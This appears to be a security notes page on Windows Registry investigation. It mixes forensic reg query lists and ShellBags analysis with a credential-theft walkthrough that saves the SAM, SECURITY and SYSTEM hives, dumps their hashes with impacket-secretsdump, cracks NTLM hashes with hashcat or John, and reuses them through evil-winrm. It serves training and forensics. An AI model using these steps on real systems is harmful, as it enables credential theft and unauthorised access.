# Registry Keys

The Windows Registry is a hierarchical database that stores low-level settings for Windows and for applications that opt to use the registry. Registry keys are container objects, which contain values and subkeys. These similar to folders.

### Investigation <a href="#investigation" id="investigation"></a>

Find interesting registry or values in registry keys.

```
# OS Version
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
# User credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
# Computer Name
reg query "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName"
# Time Zone
reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation"
# Network Interface
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces"
# Connected Networks
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList"

# Autoruns
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce"

# SAM user information
reg query "HKLM\SAM\Domains\Account\Users"
reg query "HKCU\SAM\Domains\Account\Users"

# External Devices
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR"
reg query "HKLM\SYSTEM\CurrentControlSet\Enum\USB"
```

#### Location of Registry Hives <a href="#location-of-registry-hives" id="location-of-registry-hives"></a>

Registry hives (**SAM, SECURITY, SYSTEM**) are located under `C:\Windows\System32\Config` folder.

### Reveal Password from Registry Hives <a href="#reveal-password-from-registry-hives" id="reveal-password-from-registry-hives"></a>

A hive is a logical group of keys, subkeys, and values in the registry that has a set of supporting files loaded into memory when the operating system is started or a user logs in.

If the current user has SeBackupPrivilege or can access to registry hives, the password hashes can be dumped.\
Copy three hives (**SAM, SECURITY, SYSTEM**) to arbitrary direcotyr where we can access.

```
# save: Saves a copy of specified subkeys, entries, and values of the registry in a specified file.
# HKLM: HKEY_LOCAL_MACHINE
reg save HKLM\sam c:\Users\<user>\Desktop\sam.save
reg save HKLM\security c:\Users\<user>\Desktop\security.save # this is optional
reg save HKLM\system c:\Users\<user>\Desktop\system.save
```

After that, we can dump password hashes from hives.

```
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
# or without security hive
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

#### Crack Hashes <a href="#crack-hashes" id="crack-hashes"></a>

After dumping hashes, we can crack them.\
First, we extract NTLM from the hash. For example, the dumped hash is below.

```
Administrator:500:abcdefghi...:zyxwvuts...:::
```

We need only the right string "zyxwvuts…", so extract it to a text file as below.

```
echo -n "zyxwvuts..." > hash.txt
```

Now crack it using **Hashcat** or **John The Ripper**.\
See more details [**here**](https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/dumping-windows-password-hashes/).

```
# Hashcat
# -m 1000: mode NTLM
hashcat -m 1000 hash.txt wordlist.txt

# John The Ripper
john --format=nt --wordlist=wordlist.txt hash.txt
```

If we get the password, we can use it for abusing the target machine.\
For example, we can use it to **WinRM** as below.

```
evil-winrm -i <victim_ip> -u <victim_username> -p <victim_password>
```

### ShellBags <a href="#shellbags" id="shellbags"></a>

A set of registry keys that store details about a viewed folder, such as its size, position, and icon.

#### Location <a href="#location" id="location"></a>

```
c:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat
```

If we cannot found AppData folder in Explorer, click "View" tab and check "Hidden Items".

#### Access to Shellbag\*\* <a href="#access-to-shellbag" id="access-to-shellbag"></a>

1. Search "regedit" on search bar and open "Registry Editor"
2. Go to "Computer\HKEY\_CLASSES\_ROOT\LocalSettings\Software\Microsoft\Windows\Shell\Bags"

#### ShellBags Explorer <a href="#shellbags-explorer" id="shellbags-explorer"></a>

Extract ShellBags information.

1. Open "ShellBags Explorer"
2. Select "File" -> "Load offline hive"
3. Navigate to the UsrClass.dat and open the file
4. Find suspicious folder and file

### References <a href="#references" id="references"></a>

* [TryHackMe](https://tryhackme.com/r/room/expregistryforensics)
* [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries)
